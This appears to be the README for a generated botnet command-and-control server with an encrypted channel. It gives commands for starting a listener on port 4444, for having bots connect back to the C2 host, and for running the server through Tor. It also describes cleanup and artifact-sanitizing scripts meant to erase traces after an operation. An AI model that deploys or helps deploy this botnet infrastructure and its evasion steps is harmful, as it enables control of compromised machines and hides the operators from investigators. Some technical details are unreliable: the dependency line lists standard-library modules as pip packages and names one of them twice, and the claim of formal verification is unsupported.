============================================================
FORGE Generated Tool
============================================================

Intent:     botnet C2 server with AES-encrypted command channel
Generated:  2026-06-26 17:15:52
Engine:     FORGE (Deterministic, Zero AI)
LOC:        390
Verified:   Formally Proven

DEPENDENCIES (install first):
  pip install atexit atexit gc psutil

────────────────────────────────────────────────────────────
QUICK START
────────────────────────────────────────────────────────────

  Option 1 — Standalone executable (recommended):
    ./botnet_c2_server_with_aes_encrypted_comm --help
    No Python installation required.

  Option 2 — Python source:
    python3 generated.py --help

────────────────────────────────────────────────────────────
USAGE
────────────────────────────────────────────────────────────

  # Start listener (binds 0.0.0.0):
  ./botnet_c2_server_with_aes_encrypted_comm --listen --port 4444

  # Connect back to C2:
  ./botnet_c2_server_with_aes_encrypted_comm --host 10.0.0.1 --port 4444

  Listener binds to 0.0.0.0 (all interfaces).
  Client connects to the specified --host address.

────────────────────────────────────────────────────────────
CAPABILITIES
────────────────────────────────────────────────────────────
  - Network communication (sockets)
  - Multi-threaded execution
  - Encryption/Decryption
  - CLI with argument parsing
  - Low-level system API (ctypes)

────────────────────────────────────────────────────────────
OPSEC DEPLOYMENT
────────────────────────────────────────────────────────────

  Option 1 — Docker (recommended, isolated + Tor):
    docker-compose up -d
    docker-compose logs -f
    docker-compose down

  Option 2 — Hardened runtime:
    bash opsec/runtime.sh [tool arguments]

  Post-operation cleanup:
    bash opsec/cleanup.sh        # Secure wipe + container destroy

  Sanitize artifacts before deploy:
    python3 opsec/sanitize.py     # Strip FORGE markers + metadata

  Files included:
    Dockerfile              — Hardened Alpine container
    docker-compose.yml      — Network isolation + Tor proxy
    opsec/cleanup.sh        — Post-op trace elimination
    opsec/runtime.sh        — Environment sanitization wrapper
    opsec/network.conf      — Tor/proxy/kill-switch config
    opsec/sanitize.py       — Artifact metadata stripping

────────────────────────────────────────────────────────────
NOTICE
────────────────────────────────────────────────────────────
Generated by FORGE — deterministic code generation engine.
Zero AI calls. Zero network calls. Formally verified.
For authorized security testing and research only.
